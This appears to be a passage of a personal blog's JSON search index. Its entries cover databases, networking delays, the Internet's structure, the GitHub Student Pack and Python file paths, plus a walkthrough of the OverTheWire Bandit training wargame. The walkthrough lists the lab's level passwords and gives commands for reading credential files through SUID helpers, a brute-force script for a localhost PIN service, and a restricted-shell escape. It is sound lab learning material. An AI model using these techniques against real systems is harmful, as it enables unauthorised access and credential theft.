categorized under :  Relational database management system.  Hierarchical database system.  Network database system.  Object-Oriented database system.  NoSQL database system. Relational Databases : A relational database is a type of database. It uses a structure that allows us to identify and access data in relation to another piece of data in the database. Often, data in a relational database is organized into tables. Relational Database Management System or RDBMS : A relational database management system (RDBMS) is a program that allows you to create, update, and administer a relational database. Most relational database management systems use the SQL language to access the database. I’m going to focus on RDBMS because :  The most common used one.  The principales we are going to discuss here are usuable across all of them. "
    }, {
    "id": 44,
    "url": "/Over-The-Wire-Bandit/",
    "title": "OverTheWire - Bandit",
    "body": "2020/08/14 - Basic Introduction :: The Bandit wargame is aimed at absolute beginners. It will teach the basics needed to be able to play other wargames. Level 0 -&gt; Level 1: This level aims to teach us about the ssh command, which is a program for logging into a remote machine and for executing commands on a remote machine. To log into the game, run: ssh bandit. labs. overthewire. org -p 2220 -l bandit0bandit0’s password is bandit0. After logging-in, run ls command which will list all the files in the current directory, you’ll find out that there’s a readme file that contains our password for the next level as mentioned in description, use cat command to read it. PASSWORD LEVEL1 : boJ9jbbUNNfktd78OOpsqOltutMc3MY1 Level 1 -&gt; Level 2: After logging in and executing the ls command, I found that there’s a file named “-“. I used the cat command to read it but it shows a blinking cursor, which keeps on printing what I wrote, It’s very obvious that the dash “-“ is a special charachter used to refer to the stdout, So we need to skip it by using /. cat . /-PASSWORD LEVEL2 : CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Level 2 -&gt; Level 3: This level aims to teach us about the escape charachter and how to use it. cat spaces\ in\ this\ filenamePASSWORD LEVEL3 : UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Level 3 -&gt; Level 4: Hidden files are the ones that their names starts with a dot. bandit3@bandit:~/inhere$ ls -altotal 12drwxr-xr-x 2 root  root  4096 May 7 20:14 . drwxr-xr-x 3 root  root  4096 May 7 20:14 . . -rw-r----- 1 bandit4 bandit3  33 May 7 20:14 . hiddenbandit3@bandit:~/inhere$ cat . hidden PASSWORD LEVEL4 : pIwrPrtPN36QITSp3EQaw936yaFoFgAB Level 4 -&gt; Level 5: Files that their names starts with a dash can be accessed using ‘. /xxxx’ Using the cat command we can identify which file is human readable : File 7 PASSWORD LEVEL 5 : koReBOKuIDDepwhWk7jZC0RTdopnAYKh Level 5 -&gt; Level 6: Using the find command to search for a file with a 1033c size and it’s not executable : bandit5@bandit:~/inhere$ find . -type f -size 1033c ! -executable . /maybehere07/. file2PASSWORD LEVEL 6 : DXjZPULLxYr17uwoI01bNLQbtFemEgo7 Level 6 -&gt; Level 7: Using the information mentioned in the level description we can get the locate the file using the find command : bandit6@bandit:~$ find / -type f -size 33c -user bandit7 -group bandit6 2&gt;/dev/null/var/lib/dpkg/info/bandit7. passwordPASSWORD LEVEL 7 : HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs Level 7 -&gt; Level 8: Piping the cat output into grep and searching for millionth word will print the password. bandit7@bandit:~$ cat data. txt | grep millionthmillionth    cvX2JJa4CFALtqS87jk27qwqGhBM9plVPASSWORD LEVEL 8 : cvX2JJa4CFALtqS87jk27qwqGhBM9plV Level 8 -&gt; Level 9: Sorting the output using sort command and piping it into uniq command so we can get the password from the file. bandit8@bandit:~$ cat data. txt | sort | uniq -uUsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhRPASSWORD LEVEL9 : UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR Level 9 -&gt; Level 10: In this level I just used the strings command to print all human-readable strings in the file. PASSWORD LEVEL10 : truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk Level 10 -&gt; Level 11: Using base64 command with -d flag to get the password. bandit10@bandit:~$ base64 -d data. txt The password is IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPRPASSWORD LEVEL11 : IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR Level 11 -&gt; Level 12: In this level I used an external tool which is CyberChef to rotate the file content and get the password. bandit11@bandit:~$ cat data. txt Gur cnffjbeq vf 5Gr8L4qetPEsPk8htqjhRK8XSP6x2RHhAFTER ROT13 :The password is 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUuPASSWORD LEVEL12 : 5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu Level 12 -&gt; Level 13: After doing a lot of decompression, here’s the password : PASSWORD LEVEL 13 : 8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL Level 13 -&gt; Level 14: ssh bandit14@localhost -i sshkey. privatePASSWORD LEVEL 14 : 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e Level 14 -&gt; Level 15: There’s a server running in localhost waiting for us to send the current password to it. bandit14@bandit:~$ echo '4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e' | nc -v localhost 30000localhost [127. 0. 0. 1] 30000 (?) openCorrect!BfMYroe26WYalil77FoDi9qh59eK5xNrPASSWORD LEVEL 15 : BfMYroe26WYalil77FoDi9qh59eK5xNr Level 15 -&gt; Level 16:  OpenSSL comes with a client tool that you can use to connect to a secure server. The tool is similar to telnet or nc, in the sense that it handles the SSL/TLS layer but allows you to fully control the layer that comes next. To connect to a server, you need to supply a hostname and a port. For example:  $ openssl s_client -connect localhost:30001 PASSWORD LEVEL 16 : cluFn7wTiGryunymYOu4RcffSxQluehd Level 16 -&gt; Level 17: Doing the nmap scan using the ssl-cert script, we could identify which server speaks SSL, after giving it the current password, it responds with an id_rsa, so I save it inside a temporary directory and giving it the 400 permission and finally I used it to connect to the next level and retrieve the password ! PASSWORD LEVEL 17 : xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn Level 17 -&gt; Level 18: I’ve used the diff command to see the different passwords from the two files. PASSWORDS LEVEL 18 : kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd Level 18 -&gt; Level 19: Running the command from ssh will show you the password ssh bandit18@localhost cat readmePASSWORDS LEVEL 19 : IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x Level 19 -&gt; Level 20: There’s a SUID file inside home directory which is used to run commands as bandit20, so I used it to read the password. bandit19@bandit:~$ . /bandit20-do Run a command as another user.  Example: . /bandit20-do idbandit19@bandit:~$ . /bandit20-do iduid=11019(bandit19) gid=11019(bandit19) euid=11020(bandit20) groups=11019(bandit19)bandit19@bandit:~$ . /bandit20-do cat /etc/bandit_pass/bandit20 GbKksEFF4yrVs6il55v6gwY5aVje5f0jPASSWORD LEVEL 20 : GbKksEFF4yrVs6il55v6gwY5aVje5f0j Level 20 -&gt; Level 21: For this level, I started an nc listener in the localhost that sends the current password after every connection. (I used tmux to be able to run multiple terminals) bandit20@bandit:~$ echo GbKksEFF4yrVs6il55v6gwY5aVje5f0j | nc -nlvp 1234listening on [any] 1234 . . . connect to [127. 0. 0. 1] from (UNKNOWN) [127. 0. 0. 1] 41732gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGrPASSWORD LEVEL 21 : gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr Level 21 -&gt; Level 22: Looking at the cron file, it’s clear that it print the password inside a temporary file every time the system reboots. bandit21@bandit:/etc/cron. d$ cat cronjob_bandit22 @reboot bandit22 /usr/bin/cronjob_bandit22. sh &amp;&gt; /dev/null* * * * * bandit22 /usr/bin/cronjob_bandit22. sh &amp;&gt; /dev/nullbandit21@bandit:/etc/cron. d$ cat /usr/bin/cronjob_bandit22. sh #!/bin/bashchmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvcat /etc/bandit_pass/bandit22 &gt; /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvSo I looked inside that temporary file to get the password : bandit21@bandit:/etc/cron. d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgvYk7owGAcWjwMVRwrTesJEwB7WVOiILLIPASSWORD LEVEL 22 : Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI Level 22 -&gt; Level 23: Same as previous level but this time the file is generated by md5sum. bandit22@bandit:/etc/cron. d$ cat /usr/bin/cronjob_bandit23. sh#!/bin/bashmyname=$(whoami)mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)echo  Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget cat /etc/bandit_pass/$myname &gt; /tmp/$mytargetSo in order to find to find the file name I run the script locally after assigning bandit23 to myname variable. bandit22@bandit:/etc/cron. d$ myname=bandit23bandit22@bandit:/etc/cron. d$ echo I am user $myname | md5sum | cut -d ' ' -f 18ca319486bfbbc3663ea0fbe81326349bandit22@bandit:/etc/cron. d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349jc1udXuA1tiHqjIsL8yaapX5XIAI6i0nPASSWORD LEVEL 23: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n Level 23 -&gt; Level 24: For this level, you have to make a simple script inside /var/spool/bandit24 directory !#/bin/bashcat /etc/bandit_pass/bandit24 &gt; /tmp/txt. txtThen we need to make it executable using chmod +x after that our password will be in txt. txt file. PASSWORD LEVEL 24 : UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ Level 24 -&gt; Level 25: For this level, we need a brute forcing script to find the 4-digit pincode. #!/usr/bin/env python3# coding: utf-8import sysimport socketpincode = 0password =  UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ try:  # Connect to server  s = socket. socket(socket. AF_INET, socket. SOCK_STREAM)  s. connect(( 127. 0. 0. 1 , 30002))    # Print welcome message  welcome_msg = s. recv(2048)  print(welcome_msg)  # Try brute-forcing  while pincode &lt; 10000:    pincode_string = str(pincode). zfill(4)    message=password+   +pincode_string+ \n     # Send message    s. sendall(message. encode())    receive_msg = s. recv(1024)    # Check result    if  Wrong  in receive_msg:      print( Wrong PINCODE: %s  % pincode_string)    else:      print(receive_msg)      break    pincode += 1finally:  sys. exit(1)By making it executable and running it, we can retrieve the pincode. PASSWORD LEVEL 25 : uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Level 25 -&gt; Level 26: Looking at the /etc/passwd file, the Bandit26 is running /usr/bin/showtext script as a shell. bandit25@bandit:~$ cat /usr/bin/showtext#!/bin/shexport TERM=linuxmore ~/text. txtexit 0That means that we cannot actually run any command after logging in with the private key, So we need to find a vulnerability inside the script to use it and gain a shell. As mentioned in SANS Article, we can use more to run vim and then get the shell. This means that we have to resize the currently used terminal window in size and make it so small to enter the more environment. Once done, hit h to open the help menu. Resize the terminal window an take a look at the possible options. The most interesting command here is v, which will start the editor vi at the current line. Type in :set shell=/bin/bash within vi and type in :shell then. PASSWORD LEVEL 26 : 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z Level 26 -&gt; Level 27: bandit26@bandit:~$ . /bandit27-do Run a command as another user.  Example: . /bandit27-do idbandit26@bandit:~$ . /bandit27-do iduid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)bandit26@bandit:~$ . /bandit27-do cat /etc/bandit_pass/bandit273ba3118a22e93127a4ed485be72ef5eaEasy. PASSWORD LEVEL 27: 3ba3118a22e93127a4ed485be72ef5ea Level 27 -&gt; Level 28: For this level we need to clone the repository inside a temporary directory. git clone ssh://bandit27-git@localhost/home/bandit27-git/repoPASSWORD LEVEL 28 : 0ef186ac70e04ea33b4c1853d2526fa2 Level 28 -&gt; Level 29: I did the same as the previous level, but this time the password was removed from the README file, so I checked the log file and used -p flag to see the difference between the commits. $ git log -p -1commit edd935d60906b33f0619605abd1689808ccdd5eeAuthor: Morla Porla &lt;morla@overthewire. org&gt;Date:  Thu May 7 20:14:49 2020 +0200  fix info leakdiff --git a/README. md b/README. mdindex 3f7cee8. . 5c6457b 100644--- a/README. md+++ b/README. md@@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29-- password: bbc96594b4e001778eee9975372716b2+- password: xxxxxxxxxxPASSWORD LEVEL 29 : bbc96594b4e001778eee9975372716b2 Level 29 -&gt; Level 30: After looking at the README file, it looks like there’s an another branch out there, so I ran git branch -a to list all branches. Changing to branch dev and running git show to show all commits. $ git branch -a* dev master production remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-dev$ git checkout devBranch dev set up to track remote branch dev from origin. Switched to a new branch 'dev'$ git showcommit bc833286fca18a3948aec989f7025e23ffc16c07Author: Morla Porla &lt;morla@overthewire. org&gt;Date:  Thu May 7 20:14:52 2020 +0200  add data needed for developmentdiff --git a/README. md b/README. mdindex 1af21d3. . 39b87a8 100644--- a/README. md+++ b/README. md@@ -4,5 +4,5 @@ Some notes for bandit30 of bandit. ## credentials - username: bandit30-- password: &lt;no passwords in production!&gt;+- password: 5b90576bedb2cc04c86a9e924ce42fafPASSWORD LEVEL 30 : 5b90576bedb2cc04c86a9e924ce42faf Level 30 -&gt; Level 31: This time README file and log file has nothing to show, so I tried to see tagging $ git tag secret$ git show secret 47e603bb428404d265f59c42920d81e5PASSWORD LEVEL 31 : 47e603bb428404d265f59c42920d81e5 Level 31 -&gt; Level 32: Details are in README file. andit31@bandit:/tmp/coffee32/repo$ git add key. txt -fbandit31@bandit:/tmp/coffee32/repo$ git commit -a -m 'key file'[master 6f5fbec] key file 1 file changed, 1 insertion(+) create mode 100644 key. txtbandit31@bandit:/tmp/coffee32/repo$ git pushCould not create directory '/home/bandit31/. ssh'. The authenticity of host 'localhost (127. 0. 0. 1)' can't be established. ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc. Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit31/. ssh/known_hosts). This is a OverTheWire game server. More information on http://www. overthewire. org/wargamesbandit31-git@localhost's password: Counting objects: 3, done. Delta compression using up to 2 threads. Compressing objects: 100% (2/2), done. Writing objects: 100% (3/3), 320 bytes | 0 bytes/s, done. Total 3 (delta 0), reused 0 (delta 0)remote: ### Attempting to validate files. . . ####remote: remote: . oOo. oOo. oOo. oOo. oOo. oOo. oOo. oOo. oOo. oOo. remote: remote: Well done! Here is the password for the next level:remote: 56a9bf19c63d650ce78e6ec0354ee45eremote: remote: . oOo. oOo. oOo. oOo. oOo. oOo. oOo. oOo. oOo. oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -&gt; master (pre-receive hook declined)error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'PASSWORD LEVEL 32 : 56a9bf19c63d650ce78e6ec0354ee45e Level 32 -&gt; Level 33: So after logging in, it appears like everything we type is converted to uppercase (STDIN -&gt; UPPERCASE (STDIN) -&gt; STDOUT) so typing $0 will let us type directly to /bin/bash  $0 Expands to the name of the shell or shell script. This is set at shell initialization. WELCOME TO THE UPPERCASE SHELL&gt;&gt; $0whoamibandit33cat /etc/bandit_pass/bandit33c9c3199ddf4121b10cf581a98d51caeePASSWORD LEVEL 33 : c9c3199ddf4121b10cf581a98d51caee LEVEL 33: bandit33@bandit:~$ cat README. txt Congratulations on solving the last level of this game!At this moment, there are no more levels to play in this game. However, we are constantly workingon new levels and will most likely expand this game with more levels soon. Keep an eye out for an announcement on our usual communication channels!In the meantime, you could play some of our other wargames. If you have an idea for an awesome new level, please let us know!"
    }, {
    "id": 45,
    "url": "/Delays/",
    "title": "Delay",
    "body": "2020/05/21 - Overview: Recall that a packet starts in a host, passes through a series of routers, and ends its journey in another host. As a packet travels from one node to the subsequent node along this path, the packet suffers from several types of delays at each node along the path. The most important of these delays are the nodal processing delay, queuing delay, transmission delay, and propagation delay; together, these delays accumulate to give a total nodal delay. The performance of many Internet applications are greatly affected by network delays. In order to acquire a deep understanding of packet switching and computer networks, we must understand the nature and importance of these delays. Types of Delay:  Processing Delay : The time required to examine the packet’s header and determine where to direct the packet is part of the processing delay. The processing delay can also include other factors, such as the time needed to check for bit-level errors in the packet that occured in transmitting the packet’s bits from the upstream node to the router A. Processing delays in high-speed routers are typically on the order of microseconds or less. After this nodal processing, the router directs the packet to the queue that precedes the link to router B.  Queuing Delay : At the queu, the packet experiences a queuing delay as it waits to be transmited onto the link. The length of the queuing delay of a specific packet will depend on the number of earlier-arriving packets that are queued and waiting for transmission onto the link. If the queue is empty and no other packet is currently being transmitted, then our packet’s queuing delay will be zero. On the other hand, if the traffic is heavy and many other packets are also waiting to be transmitted, the queuing delay will be long. Queuing delays can be on the order of microseconds to milliseconds in practice.  Transmission Delay : Assuming that packets are transmitted in a first-come-first-served manner, as is common in packet-switched networks, our packet can be transmitted only after all the packets that have arrived before it have been transmitted. Denote the length of the packet by L bits, and denote the transmission rate if the link from router A to router B by R bits/sec. For example, for a 10 Mbps Ethernet link, the rate is R = 10 Mbps, for a 100 Mbps Ethernet link, the rate is R = 100 Mbps. The transmission delay is L/R. This is the amount of time required to push(that is, transmità all of the packet’s bits into the link. Transmission delays are typically on the order of microseconds to milliseconds in practice.  Propagation Delay : Once a bit is pushed into the link, it needs to propagate to router B. The time required to propagate from the beginning of the link to router B is the propagation delay. The bit propagates at the propagation speed of the link. The propagation speed depends on the physical medium of the link (that is, fiber optics, twisted-pair copper wire, and so on) and is in the range of 2. 10⁸ meters/sec to 3. 10⁸ meters/sec which is equal to, or a little less than,the speed of light. The propagation delay is the distance between two routers divided by the propagation speed. That is the propagation delay is d/s, where d is the distancce between router A and router B and s is the propagation speed of the link. Once the last bit of the packet propagates to node B, it and all the preceding bits of the packet are stored in router B. The whole process then continues with router B now performing the forwarding. In wide-area networks, propagation delays are on the order of milliseconds. Comparing Transmission and Propagation Delay: Newcomers to the field of computer networking sometimes have difficulty understanding the difference between transmission delay and propagation delay. The difference is subtle but important. The transmission delay is the amount of time required for the router to push out the packet; it is a function of the packet’s length and the transmission rate of the link, but has nothing to do with the distance between the two routers. The propagation delay, on the other hand, is the time it takes a bit to propagate from one router to the next; it is a function of the distance between the two routers, but has nothing to do with the packet’s length or the transmission rate of the link. An analogy might clarify the notions of transmission and propagation dela. Consider a highway that has a tollbooth every 100 kilometers, "
    }, {
    "id": 46,
    "url": "/The-Network-Core/",
    "title": "The Network Core",
    "body": "2020/04/27 - Packet Switching: To send a message from a source end system to a destination end system, the source breaks long messages into smaller chunks of data known as packets, between source and destination, each packet travels through communication links and packet switches (Routers and link-layer switches) Store-and-Forward Transmission: Most packet switches use store-and-forward transmission at the inputs to the links, it means that the packet switch must receive the entire packet before it can begin to transmit the first but of the packet onto the outbound link. To gain some insight into store-and-forward transmission, let’s now caluclate the amount of time that elapses from when the source begins to send the packet until the destination has received the entire packet. (Here we will ignore the propagation delay - the time it takes for the bits to travel across the wire at near speed of light). The source begins to transmit at time 0; at time L/R (L is the length of a packet in bits and R is the transmission rate in bits per second),the source has transmitted the entire packet, and the entire packet has been received and stored at the router (since there’s no propagation delay). At time L/R seconds, since the router has just received the entire packet, it can begin to transmit the packet onto the outband link towards the destination; at time 2L/R, the router has transmitted the entire packet, and the entire packet has been received by the destination. Thus, the total delay is 2L/R. If the switch instead forwarded bits as soon as they arrive (without first receiving the entire packet), then the total delay would be L/R since bits are not held up at the router. Now let’s calculate the amount of time that elapses from when the source begins to send the first packet until the destination has received all three packets. As before, at time L/R, the router begins to forward the first packet, but also at time LR the source will begin ti send the second packet, since it has just finished sending the entire first packet. Same as the second and the third packets. Finally, at time 4L/R the destination has received all three packets!Let’s now consider the general case of sending one packet from source to destination over a path consisting of N links each of rate R (thus, there are N-1 routers between source and destination). Applying the same logic us above, we see that the end-to-end delay is : d = N * (L/R) Queuing Delays and Packet Loss: Each packet switch has multiple links attached to it. For each attached link, the packet switch has an output buffer (also called an output queue), which stores packets that the router is about to send into that link. The output buffers play a key role in packet switching. If an arriving packet needs to be transmitted onto a link but finds the link busy with the transmission of another packet, the arriving packet must wait in the output buffer. Thus, in addition to the store-and-forward delays, packets suffer output buffer queuing delays. These delays are variable and depend on the level of congestion in the network. Since the amout of buffer space is finite, an arriving packet may find that the buffer is completely full with other packets waiting for transmission. In this case, packet loss will occur - either the arriving packet or one of the already-queued packets will be dropped. Forwarding Tables and Routing Protocols: In the Internet, every end system has an address called an IP address. When a source end system wants to send a packet to a destination end system, the source includes the destination’s IP address in the packet’s header. When a packet arrives at a router in the network, the router examines a portion of the packet’s destination address and forwards the packet to an adjacent router. More specifically, each router has a forwarding table that maps destination addresses (or portions of the destination addresses) to the router’s outbound links. When a packet arrives at a router, the router examines the address and searches its forwarding table, using this destination address, to find the appropriate outbound link. The router then directs the packet to this outbound link. Note that the Internet has a number of special routing protocols that are used to automatically set the forwarding tables. A routing protocol may, for example, determine the shortest path from each router to each destination and use the shortest path results to configure the forwarding tbales in the routers. Circuit Switching: There are two fundamental approaches to moving data through a network of links and switches: circuit switching and packet switching. In circuit-switched networks, the resources needed along a path (buffers, link, transmission rate) to provide communication between the end systems are preserved for the duration of the communication session between the end systems. In packet-switched networks, these resources are not reserved; a sessions’s messages use the resources on demand, and a consequence, may have to wait (that is, queue) for acess to a communication link. Multiplexing in Circuit-Switched Networks: A circuit in a link is implemented with either frequency-division multiplexing (FDM) or time-division multiplexing (TDM). With FDM, the frequency spectrum of a link is divided among the connections established across the link. For a TDM link, time is divided into frames of fixed duration, and each frame is divided into a fixed number of time slots. A Network of Networks: Over the years, the network of networks that forms the Internet has evolved into a very complex structure. Much of this evolution is driven by economics and national policy, rather than by performance considerations. In orer to understand today’s Internet network structure, let’s incrementally build a series of network structures, with each new structure being a better approximation of the complex Internet that we have today. Recall that the overarching goal is to interconnect the access ISPs so that all end systems can send packets to each other. One naive approach would be to have each access ISP directly connect with every other access ISP. Such a mesh desing is, of course, much too costly for the access ISPs, as it would require each access ISP to hava a separate communication link to each of the hundreds of thousands of other access ISPs all over the world. Our first network structure, Network structure 1, interconnects all of the access ISPs with a single globale transit ISP. Our (imaginary) global transit ISP is a network of routers and communication links that not only spans the globe, but also has at least one router near each of the hundreds of thousands of access ISPs. Of course, it would be very costly for the global ISP to build such an extensive network. To be profitable, it would naturally charge each of the access ISPs for connectivity, with the pricing reflecting (but not necessarily directly propotional to) the amount of traffic an access ISP exchanges with the global ISP. Since the access ISP pays the global transit ISP, the access ISP is said to be a customer and the global transit ISP is said to be a provider. Now if some company builds and operates a global transit ISP that is profitable, then it is natural for other companies to build their own global transit ISPs and compete with the original global transit ISP. This leads to Network Structure 2, which consists of the hundreds of the thousands of access ISPs and multiple global transit ISPs. The access ISPs certainly prefer Network Structure 2 over Network Structure 1 since they can now choose among the competing global transit providers as a function of their pricing and services. Note, however, that the global transit ISPs themselves must interconnect: Otherwise access ISPs connected to one of the global transit providers would not be able to communicate with access ISPs connected to the other global transit providers. Network Structure, just described, is a two-tier hierarchy with global transit providers residing at the top tier and access ISPs at the bottom tier. This assumers that global transit ISPs are not only capable of getting close to each and every access ISP, but also find it economically desirable to do so. In reality, although some ISPs do have impressive global coverage and do directly connect with many access ISOs, no ISP has presence in each and every city in the world. Instead, in any given region, there may be a regional ISP to which the access ISPs in the region connect. Each regional ISP then connects to tier-1 ISPs. Tier-1 ISPs are similar to our (imaginary) global transit ISP; but tier-1 ISPs, which actually do exist, do not have a presence in every city in the world. Returning to this network of networks, not only are there multiple competing tier-1 ISPs, there may be multiple competing regional ISPs in a region. In such hierarchy, each access ISP pays the regional ISP to which it connects, and each regional ISP pays the tier-1 ISP to which it connects. To build a network that more closely resembles today’s Internet, we must add points of presence (PoPs), multi-homing, peering, and Internet exchange points (IXPs) to the hierarchical Network Structure 3. PoPs exist in all levels of the hierarchy, except for the bottom (access ISP) level. We finally arrive at Network Structure 5, which builds on top of Network stucture 4 by adding content provider networks. Google is currently one of the leading examples of such a content provider network. "
    }, {
    "id": 47,
    "url": "/What-Is-the-Internet/",
    "title": "What is the Internet?",
    "body": "2020/04/26 - The bigger picture: The Internet is a computer network that interconnects hundreds of millions of computing devices throughout the world. In Internet jargon, all of these devices are called hosts or end systems. End systems are connected together by a network of communication links and packet switches. Different links can transmit data at different rates, with the transmission rate of a link measured in bits/second. When one end system has data to send to another end system, the sending end system segments the data and adds header bytes to each segment. The resulting packages of information, known as packets in the jargon of computer networks, are then sent through the network to the destination end system, where they are reassembled into the original data. A packets switch takes a packet arriving on one if its incoming communication links and forwards that packet on one of its outgoing communication links. Packets switches come in many shapes and flavors, but the two most prominent types in today’s Internet are routers and link-layer switches. Both types of switches forward packets toward their ultimate destinations. Link-layer switches are typically used in access networks, while routers are typically used in the network core. The sequence of communication links and packets switched traversed by a packet from the sending end system to the receivinb end system is known as a route or path through the network. End systems, packet swithces, and other pieces of the Internet run protocols that control the sending and receiving of information within the Internet. THe Transmission Control Protocol (TCP) and the Internet Protocol (IP) are two of the most important protocols in the Internet. The IP protocol specifies the format of the packets that are sent and received among routers and end systems. The Internet’s principak protocols are collectively know as TCP/IP. Given the importance of protocols to the Internet, it’s important that everyone agree on what each and every protocol does, so that people can create systems and products that interoperate. This is where standards come into play. Internet standards are developed by the Internet Engineering Task Force (IETF). The IETF standards documents are called request for comments (RFCs). RFCs started out as general requests for comments (hence the name) to resolve network and protocol design problems that faced the precursor to the Internet. RFCs tend to be quite technical and detailed. They define protocols such as TCP, IP, HTTP(for the web), and SMTP(for e-mail). There are currently more than 6000 RFCs. Other bodies also specify standards for network components, most notably for network links. The IEEE 802 LAN/MAN Standards Committee, for example, specifies the Ethernet and Wireless WiFi standards. A Services description: Our discussion above has identified many of the pieces that muke up the Internet. But we can also describe the Internet from an entirely different angle - namely, as an infrastructure thata provides services to applications. These applications include electronuc mail, Web surfing, social networksn instant messaging, Voice-over-Ip (VoIP), and much, much more. The applications are said to be distributed applications, since they involve multiple end systems that exchange data with each other. Internet applications run on end systems - they do not run in the packets switches in the network core. Although packet switches facilitate the exchange of data among end systems, they are not concerned with the application that is the source of sink of date. End systems attached to the Internet provide an Application Programming Interface (API) that specifies how a program running on one end system asks the Internet infrastructure to deliver data to a specific destination program running on another end system. This Internet API is a set of rules that the sending program must follow so that the Internet can deliver the data to the destination program. What is a Network Protocol?: A protocol defines the format and the order of messages exchanged between two or more communicating entities, as well as the actions taken on the transmission and/or receipt of a message or other event. The Internet, and computer networks in general, make extensive use of protocols. Differenet protocols are used to accomplish different communication tasks. "
    }, {
    "id": 48,
    "url": "/Github-Education-Pack/",
    "title": "Github Student Developer Pack- A REAL FORTUNE",
    "body": "2020/04/26 - Welcome, Welcome, Welcome and Welcome ! We, as students undertaking a degree or a diploma ,have a university e-mail address (e. g xxxxx@charguia. r-iset. tn) which can be used to get the Github Student Developer Pack. What is Github ?: I will not tell you what is Github, if you don’t know what the hell is it, GTFO of here! Useful Links: Follow this Link, go sign for the GitHub Student Developer Pack, It may gets a week or even more to get verified (In my case, it lasts about 3 weeks, I was hella checking my mail everyday, literally everyday!). If you get stuck, I recommend that you check this article. Check my Github Account to watch me flexing with my PRO badge. Why ?: Well, It depends, let me tell you how I used the GitHub Student Developer Pack :  I host this website using Github Pages in a Private Repository with enforced HTTPS (Available only in the PRO Vers. ) and I got the domain name seifallahhomrani1. social FREELY ! Cool hein ?   Canva, With Canva, anyone can create professional looking graphics and designs. Featuring thousands of templates and an easy to use editor. Using the pro plan which actually costs 119$ per year, you can create stunning stuff !   JETBRAINS, which offers Professional desktop IDEs: IntelliJ IDEA, PyCharm, and more, you can use these IDEs for you programming projects, they’re so fancy! Unity, The king of gaming delevopment plus Student Plan which offers alot of cool stuff. That would be great! repl. it, my lovely boy; With it I can write code, anywhere, anytime! I even use it to solve some CTFs which requires running webpages, easy-peasy ! Pageclip, A server for your static websites and HTML forms. Well that looks interesting, I may use it in the future. Final thoughts: Getting this kind of deals is not an everyday thing! Don’t waste it! And, of course Don’t waste the chance to be updated to those kind of deals by liking my facebook page. Made with :heart: ! "
    }, {
    "id": 49,
    "url": "/Files/",
    "title": "Python - Files",
    "body": "1996/11/03 - A file has two key properties : a filename (usually written as one word) and a path. The path specifies the location of a file on the computer. The Current Working Directory: You can git the current working directory as a string value with the os. getcwd() function and change it with os. chdir(). Absolute vs Relative Paths: There are two ways to specify a file path:  An absolute path, which always begins with the root folder.  A relative path, which is relative to the program’s current working directory. There are also the dot (. ) and dot-dot folders. These are not real folders but special names that can be used in a path. A single period (“dot”) for a folder name is shorthand for “this directory”. Two periods (“dot-dot”) means “the parent folder”. Creating New Folders with os. makedirs(): You can create new folders (directories) with the os. makedirs() function. For example : —&gt;&gt;&gt; import os&gt;&gt;&gt; os. makedirs(‘/home/pu71n/test’)— The os. path Module:  Handling Absolute and Relative Paths : The os. path module provides functions for returning the abolute path of a relative path and for checking whether a given path is a an abolute path. Calling os. path. abspath(path) will return a string of the absolute path of the argument. This is an easy way to convert a relative path intoan absolute one.  Calling os. path. isabs(path) will return True if the argument is an absolute path and False if it is a relative path.  Calling os. path. relpath(path,start) will return a string of a relative path from start path to path. If start is not provided, the current working directory is used as the start path.  Calling os. path. relpath() will return a relative path either from the current working directory or from the given directory. (This method only computes the relative path. The existence of the given path or directory is not checked.  Calling os. path. dirname() will return a string of everything that comes before the last slash in the path argument.  Calling os. path. basename(path) will return a string of everything that comes after the last slash in the path argument.  If you need a path’s dir name and base name together, you can just call os. path. split() to get a tuple value with these two strings. Notice that you could create the same tuple by calling os. path. dirname() and os. path. basename() and placing their return values in a tuple. Finding File Sizes and Folder Contents: Once you have ways of handling file paths, you can then start gathering information about specific files and folders. The os. path module provides functions for finding the size of a file in bytes and the files and folders inside a given folder.  Calling os. path. getsize(path) will return the size in bytes of the file in the path argument.  Calling os. listdir(path) will return a list of filename strings for each file in the path argument. (Note that this function is in the os module, not os. path)Checking Path Validity: Many Python functions will crash with an error if you supply them with a path that does not exist. Ths os. path module provides functions to check whether a given path exists and whether is is a file or folder.  Calling os. path. exists(path) will return True if the file or folder referred to in the argument exists and will return False if it does not exist.  Calling os. path. isfile(path) will return True if the path argument exists and is a file and will return False otherwise.  Calling os. path. isdir(path) will return True if the path argument exists and is a folder and will return False otherwise. The File Reading/Writing 